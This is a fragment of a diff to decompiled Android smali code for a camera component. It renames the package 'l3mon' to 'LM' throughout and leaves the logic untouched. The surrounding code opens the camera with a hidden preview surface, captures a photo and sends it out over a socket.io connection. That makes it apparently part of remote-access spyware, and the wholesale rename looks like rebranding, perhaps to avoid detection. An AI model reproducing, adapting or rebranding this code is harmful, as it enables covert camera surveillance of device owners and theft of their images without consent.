@@ -1,4 +1,4 @@
-.class public Lcom/etechd/l3mon/CameraManager;
+.class public Lcom/etechd/LM/CameraManager;
 .super Ljava/lang/Object;
 .source "CameraManager.java"
 
@@ -18,29 +18,29 @@
     invoke-direct {p0}, Ljava/lang/Object;-><init>()V
 
     .line 27
-    iput-object p1, p0, Lcom/etechd/l3mon/CameraManager;->context:Landroid/content/Context;
+    iput-object p1, p0, Lcom/etechd/LM/CameraManager;->context:Landroid/content/Context;
 
     .line 28
     return-void
 .end method
 
-.method static synthetic access$000(Lcom/etechd/l3mon/CameraManager;)V
+.method static synthetic access$000(Lcom/etechd/LM/CameraManager;)V
     .locals 0
-    .param p0, "x0"    # Lcom/etechd/l3mon/CameraManager;
+    .param p0, "x0"    # Lcom/etechd/LM/CameraManager;
 
     .line 20
-    invoke-direct {p0}, Lcom/etechd/l3mon/CameraManager;->releaseCamera()V
+    invoke-direct {p0}, Lcom/etechd/LM/CameraManager;->releaseCamera()V
 
     return-void
 .end method
 
-.method static synthetic access$100(Lcom/etechd/l3mon/CameraManager;[B)V
+.method static synthetic access$100(Lcom/etechd/LM/CameraManager;[B)V
     .locals 0
-    .param p0, "x0"    # Lcom/etechd/l3mon/CameraManager;
+    .param p0, "x0"    # Lcom/etechd/LM/CameraManager;
     .param p1, "x1"    # [B
 
     .line 20
-    invoke-direct {p0, p1}, Lcom/etechd/l3mon/CameraManager;->sendPhoto([B)V
+    invoke-direct {p0, p1}, Lcom/etechd/LM/CameraManager;->sendPhoto([B)V
 
     return-void
 .end method
@@ -49,7 +49,7 @@
     .locals 1
 
     .line 72
-    iget-object v0, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v0, p0, Lcom/etechd/LM/CameraManager;->camera:Landroid/hardware/Camera;
 
     if-eqz v0, :cond_0
 
@@ -57,14 +57,14 @@
     invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V
 
     .line 74
-    iget-object v0, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v0, p0, Lcom/etechd/LM/CameraManager;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v0}, Landroid/hardware/Camera;->release()V
 
     .line 75
     const/4 v0, 0x0
 
-    iput-object v0, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;
+    iput-object v0, p0, Lcom/etechd/LM/CameraManager;->camera:Landroid/hardware/Camera;
 
     .line 77
     :cond_0
@@ -122,11 +122,11 @@
     invoke-virtual {v3, v4, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
 
     .line 62
-    invoke-static {}, Lcom/etechd/l3mon/IOSocket;->getInstance()Lcom/etechd/l3mon/IOSocket;
+    invoke-static {}, Lcom/etechd/LM/IOSocket;->getInstance()Lcom/etechd/LM/IOSocket;
 
     move-result-object v4
 
-    invoke-virtual {v4}, Lcom/etechd/l3mon/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v4}, Lcom/etechd/LM/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v4
 
@@ -168,7 +168,7 @@
     .locals 11
 
     .line 81
-    iget-object v0, p0, Lcom/etechd/l3mon/CameraManager;->context:Landroid/content/Context;
+    iget-object v0, p0, Lcom/etechd/LM/CameraManager;->context:Landroid/content/Context;
 
     invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
 
@@ -357,10 +357,10 @@
 
     move-result-object v0
 
-    iput-object v0, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;
+    iput-object v0, p0, Lcom/etechd/LM/CameraManager;->camera:Landroid/hardware/Camera;
 
     .line 33
-    iget-object v0, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v0, p0, Lcom/etechd/LM/CameraManager;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v0}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;
 
@@ -368,13 +368,13 @@
 
     .line 34
     .local v0, "parameters":Landroid/hardware/Camera$Parameters;
-    iget-object v1, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v1, p0, Lcom/etechd/LM/CameraManager;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v1, v0}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V
 
     .line 36
     :try_start_0
-    iget-object v1, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v1, p0, Lcom/etechd/LM/CameraManager;->camera:Landroid/hardware/Camera;
 
     new-instance v2, Landroid/graphics/SurfaceTexture;
 
@@ -385,7 +385,7 @@
     invoke-virtual {v1, v2}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V
 
     .line 37
-    iget-object v1, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v1, p0, Lcom/etechd/LM/CameraManager;->camera:Landroid/hardware/Camera;
 
     invoke-virtual {v1}, Landroid/hardware/Camera;->startPreview()V
     :try_end_0
@@ -405,11 +405,11 @@
     .line 42
     .end local v1    # "e":Ljava/lang/Exception;
     :goto_0
-    iget-object v1, p0, Lcom/etechd/l3mon/CameraManager;->camera:Landroid/hardware/Camera;
+    iget-object v1, p0, Lcom/etechd/LM/CameraManager;->camera:Landroid/hardware/Camera;
 
-    new-instance v2, Lcom/etechd/l3mon/CameraManager$1;
+    new-instance v2, Lcom/etechd/LM/CameraManager$1;
 
-    invoke-direct {v2, p0}, Lcom/etechd/l3mon/CameraManager$1;-><init>(Lcom/etechd/l3mon/CameraManager;)V
+    invoke-direct {v2, p0}, Lcom/etechd/LM/CameraManager$1;-><init>(Lcom/etechd/LM/CameraManager;)V
 
     const/4 v3, 0x0
 
